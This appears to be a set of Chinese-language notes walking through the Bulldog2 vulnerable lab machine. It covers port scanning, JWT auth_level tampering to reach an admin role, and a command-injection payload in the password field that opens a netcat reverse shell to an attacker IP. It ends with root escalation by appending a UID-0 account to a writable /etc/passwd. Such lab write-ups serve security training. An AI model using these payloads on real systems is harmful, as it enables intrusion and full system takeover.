bulldog2  

	https://blog.csdn.net/qq_38684504/article/details/90051366

masscan --rate=10000 --ports 0-65535 192.168.100.154
	Discovered open port 80/tcp on 192.168.100.154

sudo nmap -A 192.168.100.154
	80/tcp open  http    nginx 1.14.0 (Ubuntu)

whatweb 192.168.100.154
	http://192.168.100.154 [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.14.0 (Ubuntu)], IP[192.168.100.154], Script[text/javascript], Title[Bulldog.social], UncommonHeaders[access-control-allow-origin], X-Powered-By[Express], nginx[1.14.0]

dirsearch  -u http://192.168.100.154
	[15:57:47] 301 -  179B  - /assets  ->  /assets/                                                  
	[15:58:41] 200 -    5KB - /favicon.ico                                                           
	[16:00:21] 400 -    2KB - /servlet/%C0%AE%C0%AE%C0%AF 

nikto -h 192.168.100.154  

dirb http://192.168.100.154  

http://192.168.100.154/main.8b490782e52b9899e2a7.bundle.js
return l.prototype.ngOnInit = function () {}, l.prototype.onRegisterSubmit = function () {
var l = this, n = {   name: this.name, email: this.email, username: this.username, password: this.password      };
可以发现注册所需的信息为四条，name、email、username、password，我们可以根据这四条信息进行模拟注册；

抓取向服务器提交的数据包；
POST /users/register HTTP/1.1
"name":"111",
"email":"222",

"success":true,
"msg":"User registered"
登录账户的用户名都会在链接中显示，是否直接将链接中的用户名更改后（不需要密码）就可以直接登录到另外的账户；
只要知道用户名，就可以直接登录到对方账户；但是这几个账户都没有什么可以利用的信息；

再次登录，通过Burpsuite抓包查看服务器回包的信息
返回包 带有一个JWT开头的token字段；这个token传递了什么信息呢；
JWT（Json Web Token）的声明，一般用于身份提供者和服务提供者间，来传递被认证的用户身份信息，
以便从资源服务器获取资源，也可以增加一些额外的其他业务逻辑所必须的声明信息，该token也可直接被用于认证或被加密；

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJwYXlsb2FkIjp7Im5hbWUiOiIxMTEiLCJlbWFpbCI6IjIyMiIsInVzZXJuYW1lIjoieGlhb3hpYW9yYW4iLCJhdXRoX2xldmVsIjoic3RhbmRhcmRfdXNlciJ9LCJpYXQiOjE2Mjg0MTE1MjMsImV4cCI6MTYyOTAxNjMyM30.bGiuL-mJmr4NL5R4RFDcTHeQqzUDavqXjb1lZcsxOPE

{
  "alg": "HS256",
  "typ": "JWT"
}
{
  "payload": {
    "name": "111",
    "email": "222",
    "username": "xiaoxiaoran",
    "auth_level": "standard_user"
  },
  "iat": 1628411523,
  "exp": 1629016323
}

可以看到有个auth_level的参数，通过名字可以看出是关于用户权限的，我们可以使用这个参数去在js文件中进行搜索；auth_level

if("master_admin_user"==n.auth_level)return this.user=n,

退出账号并重新登录，抓包——>Do intercept——>response to this request；
然后forward，获取如下页面，复制修改后的新编码替换原来的编码，注：后面明文处也要修改成“master_admin_user”，然后一直forward；

此时，登录上去的账号为admin；

修改密码处存在命令执行漏洞，获取shell；
密码不正确，但是服务器返回的状态码依然是200；
可以发现页面返回的状态码是200，但是最后一行显示的是false；

直接在修改密码处执行漏洞拿反弹shell；


{
  "username": "xiaoxiaoran",
  "password": "111 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.100.143 1234 >/tmp/f;"
}

kali
nc -lvp 1234   
listening on [any] 1234 ...
192.168.100.154: inverse host lookup failed: Unknown host
connect to [192.168.100.143] from (UNKNOWN) [192.168.100.154] 60168
/bin/sh: 0: can't access tty; job control turned off

成功获取到shell后，就需要进行提权操作；

查看passwd文件的权限；可以看到权限为777
添加一个新的具有root权限的账户；
perl -le 'print crypt("pass", "aa")'
	aaW3cJZ7OSoQM
其中，pass为加密的密码；aa表示使用的加密盐（可以有aa,sa,Fx等），如果不使用加密盐，那么输出的字符串将不是crypt加密格式，而是MD5加密格式的。所以，加密盐其实是必须的参数

将新创建的用户写到passwd文件中；
	echo 'xyz:aaW3cJZ7OSoQM:0:0:xyz:/root:/bin/bash' >>passwd
su xyz ,密码为pass；

一般情况下，如果网站没有发现什么可利用的目录，就可以尝试查看js页面，一般会有突破口；
如果一个页面输入的用户名或密码错误，但是返回的状态码依然是200的话，就可以尝试进行命令执行漏洞，获取shell；
如果普通用户权限对/etc/passwd文件有写权限，我们就可以提权时创建一个新用户（perl -le 'print crypt("pass","aa")'），将其以root用户的格式写入/etc/passwd文件中，然后su 创建的用户  就可以提权成功；
